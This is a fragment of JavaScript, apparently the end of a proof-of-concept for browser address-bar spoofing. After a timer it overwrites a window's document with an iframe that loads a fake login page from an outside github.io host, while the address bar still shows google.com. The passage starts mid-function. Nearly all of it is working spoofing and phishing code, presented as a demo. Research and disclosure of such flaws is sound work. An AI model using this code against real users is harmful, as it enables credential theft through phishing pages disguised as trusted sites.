    }

    setTimeout(function () {
        try {
            // Replace document with attacker content (iframe only)
            win.document.open();
            win.document.write(`
                <p class="note">
                    Demo: Address bar shows google.com, but content below is attacker-controlled.
                </p>

                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
            `);
            win.document.close();

        } catch (e) {
            console.log("Blocked:", e);
        }
    }, 1900);
}
</script>
